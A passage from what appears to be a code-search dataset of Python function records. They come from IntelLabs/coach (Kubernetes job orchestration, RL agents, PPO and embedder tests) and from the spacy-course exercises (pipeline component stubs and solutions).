metadata=k8sclient.V1ObjectMeta(labels={'app': name}),\n        spec=k8sclient.V1PodSpec(\n            containers=[container],\n            volumes=[k8sclient.V1Volume(\n                name=\"nfs-pvc\",\n                persistent_volume_claim=self.nfs_pvc\n            )],\n            restart_policy='Never'\n        ),\n    )\nelif self.params.data_store_params.store_type == \"s3\":\n    container = k8sclient.V1Container(\n        name=name,\n        image=trainer_params.image,\n        command=trainer_params.command,\n        args=trainer_params.arguments,\n        image_pull_policy='Always',\n        env=[k8sclient.V1EnvVar(\"ACCESS_KEY_ID\", self.s3_access_key),\n             k8sclient.V1EnvVar(\"SECRET_ACCESS_KEY\", self.s3_secret_key)],\n        stdin=True,\n        tty=True\n    )\n    template = k8sclient.V1PodTemplateSpec(\n        metadata=k8sclient.V1ObjectMeta(labels={'app': name}),\n        spec=k8sclient.V1PodSpec(\n            containers=[container],\n            restart_policy='Never'\n        ),\n    )\nelif self.params.data_store_params.store_type == \"redis\":\n    container = k8sclient.V1Container(\n        name=name,\n        image=trainer_params.image,\n        command=trainer_params.command,\n        args=trainer_params.arguments,\n        image_pull_policy='Always',\n        stdin=True,\n        tty=True,\n        resources=k8sclient.V1ResourceRequirements(\n            limits={\n                \"cpu\": \"24\",\n                \"memory\": \"4Gi\",\n                \"nvidia.com/gpu\": \"1\",\n            }\n        ),\n    )\n    template = k8sclient.V1PodTemplateSpec(\n        metadata=k8sclient.V1ObjectMeta(labels={'app': name}),\n        spec=k8sclient.V1PodSpec(\n            containers=[container],\n            restart_policy='Never'\n        ),\n    )\nelse:\n    raise ValueError(\"unexpected store_type {}. expected 's3', 'nfs', 'redis'\".format(\n        self.params.data_store_params.store_type\n    ))\n\njob_spec = k8sclient.V1JobSpec(\n    completions=1,\n    template=template\n)\n\njob = k8sclient.V1Job(\n    api_version=\"batch/v1\",\n    kind=\"Job\",\n    metadata=k8sclient.V1ObjectMeta(name=name),\n    spec=job_spec\n)\n\napi_client = k8sclient.BatchV1Api()\ntry:\n    api_client.create_namespaced_job(self.params.namespace, job)\n    trainer_params.orchestration_params['job_name'] = name\n    return True\nexcept k8sclient.rest.ApiException as e:\n    print(\"Got exception: %s\\n while creating job\", e)\n    return False", "path": "coach/rl_coach/orchestrators/kubernetes_orchestrator.py", "commit_date": "2019-11-03 00:00:00", "repo_name": "IntelLabs/coach", "stars": 2298, "license": "apache-2.0", "language": "python", "size": 75315}
{"docstring": "\"\"\"\nGet the actions from all the agents in the group. Then use the decision policy in order to\nextract a single action out of the list of actions.\n:return: the chosen action and its corresponding information\n\"\"\"\n\n# update counters\n", "func_signal": "def act(self) -> ActionInfo:\n", "code": "self.total_steps_counter += 1\nself.current_episode_steps_counter += 1\n\n# get the actions info from all the agents\nactions_info = {}\nfor agent_name, agent in self.agents.items():\n    action_info = agent.act()\n    actions_info[agent_name] = action_info\n\n# decide on a single action to apply to the environment\naction_info = self.decision_policy.choose_action(actions_info)\n\n# TODO: make the last action info a property?\n# pass the action info to all the observers\nfor agent_name, is_decision_maker in self.decision_makers.items():\n    if not is_decision_maker:\n        self.agents[agent_name].last_action_info = action_info\nself.last_action_info = action_info\n\nreturn self.last_action_info", "path": "coach/rl_coach/agents/composite_agent.py", "commit_date": "2019-03-19 00:00:00", "repo_name": "IntelLabs/coach", "stars": 2298, "license": "apache-2.0", "language": "python", "size": 75315}
{"docstring": "# creating a deep vector embedder with relu\n", "func_signal": "def test_activation_function(reset):\n", "code": "is_training = tf.Variable(False, trainable=False, collections=[tf.GraphKeys.LOCAL_VARIABLES])\nembedder = VectorEmbedder(np.array([10]), name=\"relu\", scheme=EmbedderScheme.Deep,\n                          activation_function=tf.nn.relu, is_training=is_training)\n\n# call the embedder\nembedder()\n\n# try feeding a batch of one example\ninput = np.random.rand(1, 10)\nsess = tf.Session()\nsess.run(tf.global_variables_initializer())\noutput = sess.run(embedder.output, {embedder.input: input})\nassert np.all(output >= 0)  # should have flattened the input\n\n# creating a deep vector embedder with tanh\nembedder_tanh = VectorEmbedder(np.array([10]), name=\"tanh\", scheme=EmbedderScheme.Deep,\n                               activation_function=tf.nn.tanh, is_training=is_training)\n\n# call the embedder\nembedder_tanh()\n\n# try feeding a batch of one example\ninput = np.random.rand(1, 10)\nsess = tf.Session()\nsess.run(tf.global_variables_initializer())\noutput = sess.run(embedder_tanh.output, {embedder_tanh.input: input})\nassert np.all(output >= -1) and np.all(output <= 1)", "path": "coach/rl_coach/tests/architectures/tensorflow_components/embedders/test_vector_embedder.py", "commit_date": "2019-06-23 00:00:00", "repo_name": "IntelLabs/coach", "stars": 2298, "license": "apache-2.0", "language": "python", "size": 75315}
{"docstring": "\"\"\"\nMake any changes needed when each episode is ended.\nThis includes incrementing counters, updating full episode dependent values, updating logs, etc.\nThis function is called right after each episode is ended.\n\n:return: None\n\"\"\"\n", "func_signal": "def handle_episode_ended(self) -> None:\n", "code": "self.current_episode += 1\n[agent.handle_episode_ended() for agent in self.agents.values()]", "path": "coach/rl_coach/agents/composite_agent.py", "commit_date": "2019-03-19 00:00:00", "repo_name": "IntelLabs/coach", "stars": 2298, "license": "apache-2.0", "language": "python", "size": 75315}
{"docstring": "\"\"\"\nDeploys the memory backend and data stores if required.\n\"\"\"\n\n", "func_signal": "def setup(self, crd=None) -> bool:\n", "code": "self.memory_backend.deploy()\n\nif self.params.data_store_params.store_type == \"redis\":\n    self.data_store.params.redis_address = self.memory_backend.params.redis_address\n    self.data_store.params.redis_port = self.memory_backend.params.redis_port\n\nif not self.data_store.deploy():\n    return False\nif self.params.data_store_params.store_type == \"nfs\":\n    self.nfs_pvc = self.data_store.get_info()\n\n# Upload checkpoints in checkpoint_restore_dir (if provided) to the data store\nself.data_store.setup_checkpoint_dir(crd)\nreturn True", "path": "coach/rl_coach/orchestrators/kubernetes_orchestrator.py", "commit_date": "2019-11-03 00:00:00", "repo_name": "IntelLabs/coach", "stars": 2298, "license": "apache-2.0", "language": "python", "size": 75315}
{"docstring": "\"\"\"\nGet the logs from trainer.\n\"\"\"\n", "func_signal": "def trainer_logs(self):\n", "code": "trainer_params = self.params.run_type_params.get(str(RunType.TRAINER), None)\nif not trainer_params:\n    return\n\napi_client = k8sclient.CoreV1Api()\npod = None\ntry:\n    pods = api_client.list_namespaced_pod(self.params.namespace, label_selector='app={}'.format(\n        trainer_params.orchestration_params['job_name']\n    ))\n\n    pod = pods.items[0]\nexcept k8sclient.rest.ApiException as e:\n    print(\"Got exception: %s\\n while reading pods\", e)\n    return\n\nif not pod:\n    return\n\nreturn self.tail_log(pod.metadata.name, api_client)", "path": "coach/rl_coach/orchestrators/kubernetes_orchestrator.py", "commit_date": "2019-11-03 00:00:00", "repo_name": "IntelLabs/coach", "stars": 2298, "license": "apache-2.0", "language": "python", "size": 75315}
{"docstring": "# check lower loss for policy with better probabilities:\n# i.e. higher probability on high advantage actions, low probability on low advantage actions.\n", "func_signal": "def test_clipped_ppo_loss_discrete_batch():\n", "code": "loss_fn = ClippedPPOLossDiscrete(num_actions=2,\n                                 clip_likelihood_ratio_using_epsilon=None,\n                                 use_kl_regularization=True,\n                                 initial_kl_coefficient=1)\nloss_fn.initialize()\n\n# actual actions taken, of shape (batch_size)\nactions = mx.nd.array((0, 1, 0))\n# advantages from taking action, of shape (batch_size)\nadvantages = mx.nd.array((-2, 2, 1))\n# action probabilities, of shape (batch_size, num_actions)\nold_policy_probs = mx.nd.array(((0.7, 0.3), (0.2, 0.8), (0.4, 0.6)))\nnew_policy_probs_worse = mx.nd.array(((0.9, 0.1), (0.2, 0.8), (0.4, 0.6)))\nnew_policy_probs_better = mx.nd.array(((0.5, 0.5), (0.2, 0.8), (0.4, 0.6)))\n\nclip_param_rescaler = mx.nd.array((1,))\n\nloss_worse = loss_fn(new_policy_probs_worse, actions, old_policy_probs, clip_param_rescaler, advantages)\nloss_better = loss_fn(new_policy_probs_better, actions, old_policy_probs, clip_param_rescaler, advantages)\n\nassert len(loss_worse) == 6  # (LOSS, REGULARIZATION, KL, ENTROPY, LIKELIHOOD_RATIO, CLIPPED_LIKELIHOOD_RATIO)\nlw_loss, lw_reg, lw_kl, lw_ent, lw_lr, lw_clip_lr = loss_worse\nassert lw_loss.ndim == 1\nassert lw_loss.shape[0] == 1\nassert len(loss_better) == 6  # (LOSS, REGULARIZATION, KL, ENTROPY, LIKELIHOOD_RATIO, CLIPPED_LIKELIHOOD_RATIO)\nlb_loss, lb_reg, lb_kl, lb_ent, lb_lr, lb_clip_lr = loss_better\nassert lb_loss.ndim == 1\nassert lb_loss.shape[0] == 1\nassert lw_loss > lb_loss\nassert lw_kl > lb_kl", "path": "coach/rl_coach/tests/architectures/mxnet_components/heads/test_ppo_head.py", "commit_date": "2018-11-07 00:00:00", "repo_name": "IntelLabs/coach", "stars": 2298, "license": "apache-2.0", "language": "python", "size": 75315}
{"docstring": "\"\"\"\nUndeploy all the components, such as trainer and rollout worker(s), Redis pub/sub and data store, when required.\n\"\"\"\n\n", "func_signal": "def undeploy(self):\n", "code": "trainer_params = self.params.run_type_params.get(str(RunType.TRAINER), None)\napi_client = k8sclient.BatchV1Api()\ndelete_options = k8sclient.V1DeleteOptions(\n    propagation_policy=\"Foreground\"\n)\n\nif trainer_params:\n    try:\n        api_client.delete_namespaced_job(trainer_params.orchestration_params['job_name'], self.params.namespace, delete_options)\n    except k8sclient.rest.ApiException as e:\n        print(\"Got exception: %s\\n while deleting trainer\", e)\nworker_params = self.params.run_type_params.get(str(RunType.ROLLOUT_WORKER), None)\nif worker_params:\n    try:\n        api_client.delete_namespaced_job(worker_params.orchestration_params['job_name'], self.params.namespace, delete_options)\n    except k8sclient.rest.ApiException as e:\n        print(\"Got exception: %s\\n while deleting workers\", e)\nself.memory_backend.undeploy()\nself.data_store.undeploy()", "path": "coach/rl_coach/orchestrators/kubernetes_orchestrator.py", "commit_date": "2019-11-03 00:00:00", "repo_name": "IntelLabs/coach", "stars": 2298, "license": "apache-2.0", "language": "python", "size": 75315}
{"docstring": "# reward is clipped\n", "func_signal": "def test_get_filtered_reward_space(clip_filter):\n", "code": "reward_space = RewardSpace(1, -100, 100)\nfiltered_reward_space = clip_filter.get_filtered_reward_space(reward_space)\n\n# make sure the new reward space shape is calculated correctly\nassert filtered_reward_space.shape == 1\nassert filtered_reward_space.low == 2\nassert filtered_reward_space.high == 10\n\n# reward is unclipped\nreward_space = RewardSpace(1, 5, 7)\nfiltered_reward_space = clip_filter.get_filtered_reward_space(reward_space)\n\n# make sure the new reward space shape is calculated correctly\nassert filtered_reward_space.shape == 1\nassert filtered_reward_space.low == 5\nassert filtered_reward_space.high == 7\n\n# infinite reward is clipped\nreward_space = RewardSpace(1, -np.inf, np.inf)\nfiltered_reward_space = clip_filter.get_filtered_reward_space(reward_space)\n\n# make sure the new reward space shape is calculated correctly\nassert filtered_reward_space.shape == 1\nassert filtered_reward_space.low == 2\nassert filtered_reward_space.high == 10", "path": "coach/rl_coach/tests/filters/reward/test_reward_clipping_filter.py", "commit_date": "2018-08-13 00:00:00", "repo_name": "IntelLabs/coach", "stars": 2298, "license": "apache-2.0", "language": "python", "size": 75315}
{"docstring": "# batch contains a list of episodes to learn from\n", "func_signal": "def learn_from_batch(self, batch):\n", "code": "network_keys = self.ap.network_wrappers['main'].input_embedders_parameters.keys()\n\ntotal_returns = batch.n_step_discounted_rewards()\nfor i in reversed(range(batch.size)):\n    if self.policy_gradient_rescaler == PolicyGradientRescaler.TOTAL_RETURN:\n        total_returns[i] = total_returns[0]\n    elif self.policy_gradient_rescaler == PolicyGradientRescaler.FUTURE_RETURN:\n        # just take the total return as it is\n        pass\n    elif self.policy_gradient_rescaler == PolicyGradientRescaler.FUTURE_RETURN_NORMALIZED_BY_EPISODE:\n        # we can get a single transition episode while playing Doom Basic, causing the std to be 0\n        if self.std_discounted_return != 0:\n            total_returns[i] = (total_returns[i] - self.mean_discounted_return) / self.std_discounted_return\n        else:\n            total_returns[i] = 0\n    elif self.policy_gradient_rescaler == PolicyGradientRescaler.FUTURE_RETURN_NORMALIZED_BY_TIMESTEP:\n        total_returns[i] -= self.mean_return_over_multiple_episodes[i]\n    else:\n        screen.warning(\"WARNING: The requested policy gradient rescaler is not available\")\n\ntargets = total_returns\nactions = batch.actions()\nif type(self.spaces.action) != DiscreteActionSpace and len(actions.shape) < 2:\n    actions = np.expand_dims(actions, -1)\n\nself.returns_mean.add_sample(np.mean(total_returns))\nself.returns_variance.add_sample(np.std(total_returns))\n\nresult = self.networks['main'].online_network.accumulate_gradients(\n    {**batch.states(network_keys), 'output_0_0': actions}, targets\n)\ntotal_loss, losses, unclipped_grads = result[:3]\n\nreturn total_loss, losses, unclipped_grads", "path": "coach/rl_coach/agents/policy_gradients_agent.py", "commit_date": "2018-11-15 00:00:00", "repo_name": "IntelLabs/coach", "stars": 2298, "license": "apache-2.0", "language": "python", "size": 75315}
{"docstring": "# creating a deep vector embedder\n", "func_signal": "def test_complex_embedder(reset):\n", "code": "is_training = tf.Variable(False, trainable=False, collections=[tf.GraphKeys.LOCAL_VARIABLES])\nembedder = VectorEmbedder(np.array([10]), name=\"test\", scheme=EmbedderScheme.Deep, is_training=is_training)\n\n# call the embedder\nembedder()\n\n# try feeding a batch of one example\ninput = np.random.rand(1, 10)\nsess = tf.Session()\nsess.run(tf.global_variables_initializer())\noutput = sess.run(embedder.output, {embedder.input: input})\nassert output.shape == (1, 128)  # should have flattened the input", "path": "coach/rl_coach/tests/architectures/tensorflow_components/embedders/test_vector_embedder.py", "commit_date": "2019-06-23 00:00:00", "repo_name": "IntelLabs/coach", "stars": 2298, "license": "apache-2.0", "language": "python", "size": 75315}
{"docstring": "\"\"\"\nMake sure that the size of the replay buffer does not pass the maximum size allowed.\nIf it passes the max size, the oldest transition in the replay buffer will be removed.\nThis function does not use locks since it is only called internally\n:return: None\n\"\"\"\n", "func_signal": "def _enforce_max_length(self) -> None:\n", "code": "granularity, size = self.max_size\nif granularity == MemoryGranularity.Transitions:\n    while size != 0 and self.num_transitions() > size:\n        self.remove_transition(0, False)\nelse:\n    raise ValueError(\"The granularity of the replay buffer can only be set in terms of transitions\")", "path": "coach/rl_coach/memories/non_episodic/experience_replay.py", "commit_date": "2019-07-14 00:00:00", "repo_name": "IntelLabs/coach", "stars": 2298, "license": "apache-2.0", "language": "python", "size": 75315}
{"docstring": "\"\"\"\nDeploys the rollout worker(s) in Kubernetes.\n\"\"\"\n\n", "func_signal": "def deploy_worker(self):\n", "code": "worker_params = self.params.run_type_params.get(str(RunType.ROLLOUT_WORKER), None)\nif not worker_params:\n    return False\n\n# At this point, the memory backend and data store have been deployed and in the process,\n# these parameters have been updated to include things like the hostname and port the\n# service can be found at.\nworker_params.command += ['--memory_backend_params', json.dumps(self.params.memory_backend_parameters.__dict__)]\nworker_params.command += ['--data_store_params', json.dumps(self.params.data_store_params.__dict__)]\nworker_params.command += ['--num_workers', '{}'.format(worker_params.num_replicas)]\n\nname = \"{}-{}\".format(worker_params.run_type, uuid.uuid4())\n\n# TODO: instead of defining each container and template spec from scratch, loaded default\n# configuration and modify them as necessary depending on the store type\nif self.params.data_store_params.store_type == \"nfs\":\n    container = k8sclient.V1Container(\n        name=name,\n        image=worker_params.image,\n        command=worker_params.command,\n        args=worker_params.arguments,\n        image_pull_policy='Always',\n        volume_mounts=[k8sclient.V1VolumeMount(\n            name='nfs-pvc',\n            mount_path=worker_params.checkpoint_dir\n        )],\n        stdin=True,\n        tty=True\n    )\n    template = k8sclient.V1PodTemplateSpec(\n        metadata=k8sclient.V1ObjectMeta(labels={'app': name}),\n        spec=k8sclient.V1PodSpec(\n            containers=[container],\n            volumes=[k8sclient.V1Volume(\n                name=\"nfs-pvc\",\n                persistent_volume_claim=self.nfs_pvc\n            )],\n            restart_policy='Never'\n        ),\n    )\nelif self.params.data_store_params.store_type == \"s3\":\n    container = k8sclient.V1Container(\n        name=name,\n        image=worker_params.image,\n        command=worker_params.command,\n        args=worker_params.arguments,\n        image_pull_policy='Always',\n        env=[k8sclient.V1EnvVar(\"ACCESS_KEY_ID\", self.s3_access_key),\n             k8sclient.V1EnvVar(\"SECRET_ACCESS_KEY\", self.s3_secret_key)],\n        stdin=True,\n        tty=True\n    )\n    template = k8sclient.V1PodTemplateSpec(\n        metadata=k8sclient.V1ObjectMeta(labels={'app': name}),\n        spec=k8sclient.V1PodSpec(\n            containers=[container],\n            restart_policy='Never'\n        )\n    )\nelif self.params.data_store_params.store_type == \"redis\":\n    container = k8sclient.V1Container(\n        name=name,\n        image=worker_params.image,\n        command=worker_params.command,\n        args=worker_params.arguments,\n        image_pull_policy='Always',\n        stdin=True,\n        tty=True,\n        resources=k8sclient.V1ResourceRequirements(\n            limits={\n                \"cpu\": \"4\",\n                \"memory\": \"4Gi\",\n                # \"nvidia.com/gpu\": \"0\",\n            }\n        ),\n    )\n    template = k8sclient.V1PodTemplateSpec(\n        metadata=k8sclient.V1ObjectMeta(labels={'app': name}),\n        spec=k8sclient.V1PodSpec(\n            containers=[container],\n            restart_policy='Never'\n        )\n    )\nelse:\n    raise ValueError('unexpected store type {}'.format(self.params.data_store_params.store_type))\n\njob_spec = k8sclient.V1JobSpec(\n    completions=worker_params.num_replicas,\n    parallelism=worker_params.num_replicas,\n    template=template\n)\n\njob = k8sclient.V1Job(\n    api_version=\"batch/v1\",\n    kind=\"Job\",\n    metadata=k8sclient.V1ObjectMeta(name=name),\n    spec=job_spec\n)\n\napi_client = k8sclient.BatchV1Api()\ntry:\n    api_client.create_namespaced_job(self.params.namespace, job)\n    worker_params.orchestration_params['job_name'] = name\n    return True\nexcept k8sclient.rest.ApiException as e:\n    print(\"Got exception: %s\\n while creating Job\", e)\n    return False", "path": "coach/rl_coach/orchestrators/kubernetes_orchestrator.py", "commit_date": "2019-11-03 00:00:00", "repo_name": "IntelLabs/coach", "stars": 2298, "license": "apache-2.0", "language": "python", "size": 75315}
{"docstring": "# check lower loss for policy with better probabilities:\n# i.e. higher probability on high advantage actions, low probability on low advantage actions.\n", "func_signal": "def test_clipped_ppo_loss_discrete_batch_kl_div():\n", "code": "loss_fn = ClippedPPOLossDiscrete(num_actions=2,\n                                 clip_likelihood_ratio_using_epsilon=None,\n                                 use_kl_regularization=True,\n                                 initial_kl_coefficient=0.5)\nloss_fn.initialize()\n\n# actual actions taken, of shape (batch_size)\nactions = mx.nd.array((0, 1, 0))\n# advantages from taking action, of shape (batch_size)\nadvantages = mx.nd.array((-2, 2, 1))\n# action probabilities, of shape (batch_size, num_actions)\nold_policy_probs = mx.nd.array(((0.7, 0.3), (0.2, 0.8), (0.4, 0.6)))\nnew_policy_probs_worse = mx.nd.array(((0.9, 0.1), (0.2, 0.8), (0.4, 0.6)))\nnew_policy_probs_better = mx.nd.array(((0.5, 0.5), (0.2, 0.8), (0.4, 0.6)))\n\nclip_param_rescaler = mx.nd.array((1,))\n\nloss_worse = loss_fn(new_policy_probs_worse, actions, old_policy_probs, clip_param_rescaler, advantages)\nloss_better = loss_fn(new_policy_probs_better, actions, old_policy_probs, clip_param_rescaler, advantages)\n\nassert len(loss_worse) == 6  # (LOSS, REGULARIZATION, KL, ENTROPY, LIKELIHOOD_RATIO, CLIPPED_LIKELIHOOD_RATIO)\nlw_loss, lw_reg, lw_kl, lw_ent, lw_lr, lw_clip_lr = loss_worse\nassert lw_kl.ndim == 1\nassert lw_kl.shape[0] == 1\nassert len(loss_better) == 6  # (LOSS, REGULARIZATION, KL, ENTROPY, LIKELIHOOD_RATIO, CLIPPED_LIKELIHOOD_RATIO)\nlb_loss, lb_reg, lb_kl, lb_ent, lb_lr, lb_clip_lr = loss_better\nassert lb_kl.ndim == 1\nassert lb_kl.shape[0] == 1\nassert lw_kl > lb_kl\nassert lw_reg > lb_reg", "path": "coach/rl_coach/tests/architectures/mxnet_components/heads/test_ppo_head.py", "commit_date": "2018-11-07 00:00:00", "repo_name": "IntelLabs/coach", "stars": 2298, "license": "apache-2.0", "language": "python", "size": 75315}
{"docstring": "# creating a vector embedder with a matrix\n", "func_signal": "def test_embedder(reset):\n", "code": "with pytest.raises(ValueError):\n    embedder = VectorEmbedder(np.array([10, 10]), name=\"test\")\n\n# creating a simple vector embedder\nis_training = tf.Variable(False, trainable=False, collections=[tf.GraphKeys.LOCAL_VARIABLES])\npre_ops = len(tf.get_default_graph().get_operations())\n\nembedder = VectorEmbedder(np.array([10]), name=\"test\", is_training=is_training)\n\n# make sure the ops where not created yet\nassert len(tf.get_default_graph().get_operations()) == pre_ops\n\n# call the embedder\ninput_ph, output_ph = embedder()\n\n# make sure that now the ops were created\nassert len(tf.get_default_graph().get_operations()) > pre_ops\n\n# try feeding a batch of one example\ninput = np.random.rand(1, 10)\nsess = tf.Session()\nsess.run(tf.global_variables_initializer())\noutput = sess.run(embedder.output, {embedder.input: input})\nassert output.shape == (1, 256)\n\n# now make sure the returned placeholders behave the same\noutput = sess.run(output_ph, {input_ph: input})\nassert output.shape == (1, 256)\n\n# make sure the naming is correct\nassert embedder.get_name() == \"test\"", "path": "coach/rl_coach/tests/architectures/tensorflow_components/embedders/test_vector_embedder.py", "commit_date": "2019-06-23 00:00:00", "repo_name": "IntelLabs/coach", "stars": 2298, "license": "apache-2.0", "language": "python", "size": 75315}
{"docstring": "# check lower loss for policy with better probabilities:\n# i.e. higher probability on high advantage actions, low probability on low advantage actions.\n", "func_signal": "def test_clipped_ppo_loss_continuous_batch():\n", "code": "loss_fn = ClippedPPOLossContinuous(num_actions=2,\n                                   clip_likelihood_ratio_using_epsilon=0.2)\nloss_fn.initialize()\n# actual actions taken, of shape (batch_size)\nactions = mx.nd.array(((0.5, -0.5), (0.2, 0.3), (0.4, 2.0)))\n# advantages from taking action, of shape (batch_size)\nadvantages = mx.nd.array((2, -2, 1))\n# action probabilities, of shape (batch_size, num_actions)\nold_policy_means = mx.nd.array(((1, 0), (0, 0), (-1, 0)))\nnew_policy_means_worse = mx.nd.array(((2, 0), (0, 0), (-1, 0)))\nnew_policy_means_better = mx.nd.array(((0.5, 0), (0, 0), (-1, 0)))\n\npolicy_stds = mx.nd.array(((1, 1), (1, 1), (1, 1)))\nclip_param_rescaler = mx.nd.array((1,))\n\nloss_worse = loss_fn(new_policy_means_worse, policy_stds,\n                     actions, old_policy_means, policy_stds,\n                     clip_param_rescaler, advantages)\nloss_better = loss_fn(new_policy_means_better, policy_stds,\n                      actions, old_policy_means, policy_stds,\n                      clip_param_rescaler, advantages)\n\nassert len(loss_worse) == 6  # (LOSS, REGULARIZATION, KL, ENTROPY, LIKELIHOOD_RATIO, CLIPPED_LIKELIHOOD_RATIO)\nloss_worse_val = loss_worse[0]\nassert loss_worse_val.ndim == 1\nassert loss_worse_val.shape[0] == 1\nassert len(loss_better) == 6  # (LOSS, REGULARIZATION, KL, ENTROPY, LIKELIHOOD_RATIO, CLIPPED_LIKELIHOOD_RATIO)\nloss_better_val = loss_better[0]\nassert loss_better_val.ndim == 1\nassert loss_better_val.shape[0] == 1\nassert loss_worse_val > loss_better_val", "path": "coach/rl_coach/tests/architectures/mxnet_components/heads/test_ppo_head.py", "commit_date": "2018-11-07 00:00:00", "repo_name": "IntelLabs/coach", "stars": 2298, "license": "apache-2.0", "language": "python", "size": 75315}
{"docstring": "# Architecture parameters\n", "func_signal": "def __init__(self):\n", "code": "self.use_accumulated_reward_as_measurement = False\n\n# Agent parameters\nself.num_consecutive_playing_steps = EnvironmentSteps(1)\nself.num_consecutive_training_steps = 1  # TODO: update this to TrainingSteps\n\nself.heatup_using_network_decisions = False\nself.discount = 0.99\nself.apply_gradients_every_x_episodes = 5\nself.num_steps_between_copying_online_weights_to_target = TrainingSteps(0)\nself.rate_for_copying_weights_to_target = 1.0\nself.load_memory_from_file_path = None\nself.store_transitions_only_when_episodes_are_terminated = False\n\n# HRL / HER related params\nself.in_action_space = None\n\n# distributed agents params\nself.share_statistics_between_workers = True\n\n# n-step returns\nself.n_step = -1  # calculate the total return (no bootstrap, by default)\n\n# Distributed Coach params\nself.distributed_coach_synchronization_type = None\n\n# Should the workers wait for full episode\nself.act_for_full_episodes = False\n\n# Support for parameter noise\nself.supports_parameter_noise = False\n\n# Override, in retrospective, all the episode rewards with the last reward in the episode\n# (sometimes useful for sparse, end of the episode, rewards problems)\nself.override_episode_rewards_with_the_last_transition_reward = False\n\n# Filters - TODO consider creating a FilterParameters class and initialize the filters with it\nself.update_pre_network_filters_state_on_train = False\nself.update_pre_network_filters_state_on_inference = True", "path": "coach/rl_coach/base_parameters.py", "commit_date": "2019-08-05 00:00:00", "repo_name": "IntelLabs/coach", "stars": 2298, "license": "apache-2.0", "language": "python", "size": 75315}
{"docstring": "\"\"\"\nReset the episode for all the agents in the group\n:return: None\n\"\"\"\n# update counters\n", "func_signal": "def reset_internal_state(self) -> None:\n", "code": "self.total_steps_counter = 0\nself.current_episode_steps_counter = 0\nself.total_reward_in_current_episode = 0\n\n# reset all sub modules\n[agent.reset_internal_state() for agent in self.agents.values()]", "path": "coach/rl_coach/agents/composite_agent.py", "commit_date": "2019-03-19 00:00:00", "repo_name": "IntelLabs/coach", "stars": 2298, "license": "apache-2.0", "language": "python", "size": 75315}
{"docstring": "# \u628amatcher\u5e94\u7528\u5230doc\u4e0a\n", "func_signal": "def animal_component(doc):\n", "code": "matches = ____\n# \u4e3a\u6bcf\u4e00\u4e2a\u5339\u914d\u7ed3\u679c\u751f\u6210\u4e00\u4e2aSpan\u5e76\u8d4b\u4e88\u6807\u7b7e\"ANIMAL\"\nspans = [Span(____, ____, ___, label=____) for match_id, start, end in matches]\n# \u7528\u5339\u914d\u5230\u7684span\u8986\u76d6doc.ents\ndoc.ents = spans\nreturn doc", "path": "spacy-course/exercises/zh/exc_03_07.py", "commit_date": "2020-07-18 00:00:00", "repo_name": "explosion/spacy-course", "stars": 2254, "license": "mit", "language": "python", "size": 9427}
{"docstring": "# matcher\u3092doc\u306b\u9069\u7528\n", "func_signal": "def animal_component(doc):\n", "code": "matches = matcher(doc)\n# \u30de\u30c3\u30c1\u3057\u305f\u7d50\u679c\u306b\u5bfe\u3057\u3066Span\u3092\u4f5c\u308a\u3001\"ANIMAL\"\u306e\u30e9\u30d9\u30eb\u3092\u4ed8\u3051\u308b\nspans = [Span(doc, start, end, label=\"ANIMAL\") for match_id, start, end in matches]\n# doc.ents\u306b\u30de\u30c3\u30c1\u7d50\u679c\u306e\u30b9\u30d1\u30f3\u3092\u8ffd\u52a0\ndoc.ents = spans\nreturn doc", "path": "spacy-course/exercises/ja/solution_03_07.py", "commit_date": "2020-09-19 00:00:00", "repo_name": "explosion/spacy-course", "stars": 2254, "license": "mit", "language": "python", "size": 9427}
{"docstring": "# reset the Underscore object after the test, to avoid having state copied across tests\n", "func_signal": "def clean_underscore():\n", "code": "yield\nUnderscore.doc_extensions = {}\nUnderscore.span_extensions = {}\nUnderscore.token_extensions = {}", "path": "spacy-course/conftest.py", "commit_date": "2020-04-15 00:00:00", "repo_name": "explosion/spacy-course", "stars": 2254, "license": "mit", "language": "python", "size": 9427}
{"docstring": "# Generiere eine Wikipedia-URL, wenn die Span eins der Labels hat\n", "func_signal": "def get_wikipedia_url(span):\n", "code": "if span.label_ in (\"PER\", \"ORG\", \"LOC\"):\n    entity_text = span.text.replace(\" \", \"_\")\n    return \"https://de.wikipedia.org/w/index.php?search=\" + entity_text", "path": "spacy-course/exercises/de/solution_03_11.py", "commit_date": "2020-04-21 00:00:00", "repo_name": "explosion/spacy-course", "stars": 2254, "license": "mit", "language": "python", "size": 9427}
{"docstring": "# Obt\u00e9n la URL de Wikipedia si el span tiene uno de los siguientes labels\n", "func_signal": "def get_wikipedia_url(span):\n", "code": "if ____ in (\"PER\", \"ORG\", \"LOC\"):\n    entity_text = span.text.replace(\" \", \"_\")\n    return \"https://es.wikipedia.org/w/index.php?search=\" + entity_text", "path": "spacy-course/exercises/es/exc_03_11.py", "commit_date": "2020-06-05 00:00:00", "repo_name": "explosion/spacy-course", "stars": 2254, "license": "mit", "language": "python", "size": 9427}
{"docstring": "# Erstelle eine Entit\u00e4ts-Span mit dem Label \"LOC\" f\u00fcr alle Resultate\n", "func_signal": "def countries_component(doc):\n", "code": "matches = matcher(doc)\ndoc.ents = [____(____, ____, ____, label=____) for match_id, start, end in matches]\nreturn doc", "path": "spacy-course/exercises/de/exc_03_12.py", "commit_date": "2020-06-09 00:00:00", "repo_name": "explosion/spacy-course", "stars": 2254, "license": "mit", "language": "python", "size": 9427}
{"docstring": "# Get the doc's length\n", "func_signal": "def length_component(doc):\n", "code": "doc_length = ____\nprint(f\"This document is {doc_length} tokens long.\")\n# Return the doc\n____", "path": "spacy-course/exercises/en/exc_03_06.py", "commit_date": "2020-04-16 00:00:00", "repo_name": "explosion/spacy-course", "stars": 2254, "license": "mit", "language": "python", "size": 9427}
{"docstring": "# doc\u306e\u9577\u3055\u3092\u53d6\u5f97\n", "func_signal": "def length_component(doc):\n", "code": "doc_length = ____\nprint(f\"\u3053\u306e\u6587\u7ae0\u306f {doc_length} \u30c8\u30fc\u30af\u30f3\u306e\u9577\u3055\u3067\u3059\u3002\")\n# doc\u3092\u8fd4\u3059\n____", "path": "spacy-course/exercises/ja/exc_03_06.py", "commit_date": "2020-09-19 00:00:00", "repo_name": "explosion/spacy-course", "stars": 2254, "license": "mit", "language": "python", "size": 9427}
{"docstring": "# \u83b7\u53d6doc\u7684\u957f\u5ea6\n", "func_signal": "def length_component(doc):\n", "code": "doc_length = len(doc)\nprint(f\"This document is {doc_length} tokens long.\")\n# \u8fd4\u56de\u8fd9\u4e2adoc\nreturn doc", "path": "spacy-course/exercises/zh/solution_03_06.py", "commit_date": "2020-07-18 00:00:00", "repo_name": "explosion/spacy-course", "stars": 2254, "license": "mit", "language": "python", "size": 9427}
